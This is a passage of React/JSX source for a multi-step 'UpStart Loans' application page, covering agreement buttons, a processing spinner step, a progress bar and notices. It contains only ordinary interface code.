                onClick={() => {
                  if (confirm('Are you sure you want to cancel this loan agreement?')) {
                    navigate('/loan-cancelled');
                  }
                }}
                className="bg-red-600 hover:bg-red-700 text-white px-6 py-3 rounded font-medium text-sm"
              >
                I Disagree
              </button>
              <select
                value={sectionView}
                onChange={handleSectionViewChange}
                className="bg-gray-600 hover:bg-gray-700 text-white px-4 py-2 rounded text-sm cursor-pointer"
              >
                <option value="summary">Summary Only</option>
                <option value="all">Show All Sections</option>
                <option value="terms">Terms & Conditions</option>
              </select>
              <button
                onClick={(e) => downloadCompleteAgreement(e)}
                disabled={!agreementAccepted}
                className="bg-blue-600 hover:bg-blue-700 disabled:bg-gray-400 text-white px-4 py-2 rounded text-sm"
              >
                Download Agreement
              </button>
              <button
                onClick={() => {
                  if (agreementAccepted) {
                    window.print();
                  } else {
                    alert('Please accept the agreement first.');
                  }
                }}
                disabled={!agreementAccepted}
                className="bg-blue-600 hover:bg-blue-700 disabled:bg-gray-400 text-white px-4 py-2 rounded text-sm"
              >
                Print Agreement
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
    );
  };

  const renderStep3 = () => (
    <div className="max-w-2xl mx-auto text-center">
      <div className="w-20 h-20 bg-primary-100 rounded-full flex items-center justify-center mx-auto mb-6 animate-pulse-slow">
        <div className="w-10 h-10 border-4 border-primary-500 border-t-transparent rounded-full animate-spin"></div>
      </div>
      <h2 className="text-2xl font-bold text-gray-900 mb-4">Processing Your {currentLoanConfig.title} Request</h2>
      <p className="text-gray-600 mb-8">
        Reviewing your information and matching you with available financial options...
      </p>
      
      <div className="space-y-3">
        <div className="flex items-center justify-center space-x-2">
          <CheckCircle className="w-5 h-5 text-green-500" />
          <span className="text-gray-700">Information received</span>
        </div>
        <div className="flex items-center justify-center space-x-2">
          <div className="w-5 h-5 border-2 border-primary-500 border-t-transparent rounded-full animate-spin"></div>
          <span className="text-gray-700">Searching available options...</span>
        </div>
        <div className="flex items-center justify-center space-x-2">
          <div className="w-5 h-5 border-2 border-gray-300 rounded-full"></div>
          <span className="text-gray-400">Preparing your summary</span>
        </div>
      </div>
    </div>
  )

  return (
    <div className="min-h-screen bg-gray-50 py-12">
      <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
        {/* Platform Notice */}
        <div className="bg-blue-50 border border-blue-200 rounded-xl p-4 mb-8">
          <p className="text-blue-800 text-sm text-center">
            UpStart Loans provides direct lending services. Your application will be reviewed by our lending team.
          </p>
          <p className="text-sm text-gray-500 text-center max-w-2xl mx-auto">
              UpStart Loans is a direct lender providing comprehensive financial services.
            </p>
        </div>
        {/* Progress Bar */}
        <div className="mb-12">
          <div className="flex items-center justify-center space-x-4">
            <div className={`flex items-center ${currentStep >= 1 ? 'text-primary-600' : 'text-gray-400'}`}>
              <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${
                currentStep >= 1 ? 'bg-primary-600 text-white' : 'bg-gray-300'
              }`}>
                1
              </div>
              <span className="ml-2 font-medium">Your Info</span>
            </div>
            <div className={`w-16 h-1 ${currentStep >= 2 ? 'bg-primary-600' : 'bg-gray-300'}`}></div>
            <div className={`flex items-center ${currentStep >= 2 ? 'text-primary-600' : 'text-gray-400'}`}>
              <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${
                currentStep >= 2 ? 'bg-primary-600 text-white' : 'bg-gray-300'
              }`}>
                2
              </div>
              <span className="ml-2 font-medium">Verification</span>
            </div>
            <div className={`w-16 h-1 ${currentStep >= 3 ? 'bg-primary-600' : 'bg-gray-300'}`}></div>
            <div className={`flex items-center ${currentStep >= 3 ? 'text-primary-600' : 'text-gray-400'}`}>
              <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${
                currentStep >= 3 ? 'bg-primary-600 text-white' : 'bg-gray-300'
              }`}>
                3
              </div>
              <span className="ml-2 font-medium">Processing</span>
            </div>
          </div>
        </div>

        {/* Main Content */}
        <div className="bg-white rounded-2xl shadow-lg p-8">
          {currentStep === 1 && renderStep1()}
          {currentStep === 2 && !showAgreement && renderStep2()}
          {showAgreement && renderAgreementStep()}
          {currentStep === 3 && renderStep3()}
        </div>

        {/* Security Note */}
        <div className="mt-8 text-center text-sm text-gray-500">
          <div className="flex items-center justify-center space-x-2">
            <Shield className="w-4 h-4" />
            <span>Your information is secure and encrypted</span>
          </div>
        </div>
      </div>
    </div>
  )
}

export default LoanApplication
